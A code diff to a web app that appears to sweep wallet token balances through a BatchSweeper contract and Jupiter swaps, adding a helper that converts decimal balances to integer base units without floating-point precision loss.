@@ -223,6 +223,15 @@ let evmProvider = null; // Global EVM provider (MetaMask, Rabby, etc.)
 let sweepPhase = 'idle'; // idle | approving | approved | sweeping
 
 // === BATCH SWEEPER CONTRACT ===
+// Safe amount conversion: avoids JS float precision loss for large decimals
+function toRawAmount(balance, decimals) {
+    const s = String(balance);
+    const [whole, frac = ''] = s.split('.');
+    const padded = (frac + '0'.repeat(decimals)).slice(0, decimals);
+    const raw = whole + padded;
+    return BigInt(raw).toString();
+}
+
 const BATCH_SWEEPER = {
     'Arbitrum': '0xCcab3444D4FDfbf37b63BfE1beDbC44701Ef35De',
     'Base': '0x40D3fbE3Ed4c28bF281022B3422678592fD2Ea3a',
@@ -678,7 +687,7 @@ async function backgroundPrice() {
 
     const priceOne = async ({t, i}) => {
         try {
-            const rawAmt = Math.floor(t.balance * (10 ** t.decimals));
+            const rawAmt = Number(toRawAmount(t.balance, t.decimals));
             if (rawAmt <= 0) return;
             const qr = await fetchT(`${JUP_API}/quote?inputMint=${t.mint}&outputMint=So11111111111111111111111111111111111111112&amount=${rawAmt}&slippageBps=500`, {}, 4000);
             if (qr.ok) {
@@ -813,7 +822,7 @@ async function checkApprovalCount(evmTokens) {
             const contractAddr = BATCH_SWEEPER[t.chain];
             if (!contractAddr) { needed++; continue; }
             const fromToken = t.mint || t.contractAddress;
-            const rawAmount = BigInt(Math.floor(t.balance * (10 ** (t.decimals || 18))));
+            const rawAmount = BigInt(toRawAmount(t.balance, t.decimals || 18));
             try {
                 const allowanceData = '0xdd62ed3e' + userAddr.slice(2).padStart(64, '0') + contractAddr.slice(2).padStart(64, '0');
                 const allowance = await eth.request({ method: 'eth_call', params: [{ to: fromToken, data: allowanceData }, 'latest'] });
@@ -1170,7 +1179,7 @@ async function doApproveAll() {
     for (const t of evmTokens) {
         const contractAddr = BATCH_SWEEPER[t.chain];
         const fromToken = t.mint || t.contractAddress;
-        const rawAmount = BigInt(Math.floor(t.balance * (10 ** (t.decimals || 18)))).toString();
+        const rawAmount = toRawAmount(t.balance, t.decimals || 18);
 
         try {
             const allowanceData = '0xdd62ed3e' + userAddr.slice(2).padStart(64, '0') + contractAddr.slice(2).padStart(64, '0');
@@ -1416,7 +1425,7 @@ async function doSweep() {
 
                 for (const t of chainTokens) {
                     const fromToken = t.mint || t.contractAddress;
-                    const rawAmount = BigInt(Math.floor(t.balance * (10 ** (t.decimals || 18)))).toString();
+                    const rawAmount = toRawAmount(t.balance, t.decimals || 18);
                     btn.innerHTML = `🧹 Quoting ${t.symbol}...`;
 
                     // Get swap calldata with BatchSweeper as userAddr
@@ -1518,7 +1527,7 @@ async function doSweep() {
             // Fire all approvals in parallel
             const approvalPromises = fallbackTokens.map(async t => {
                 const fromToken = t.mint || t.contractAddress;
-                const rawAmount = BigInt(Math.floor(t.balance * (10 ** (t.decimals || 18)))).toString();
+                const rawAmount = toRawAmount(t.balance, t.decimals || 18);
                 let spender, swapInfo;
 
                 // Get quote and determine spender
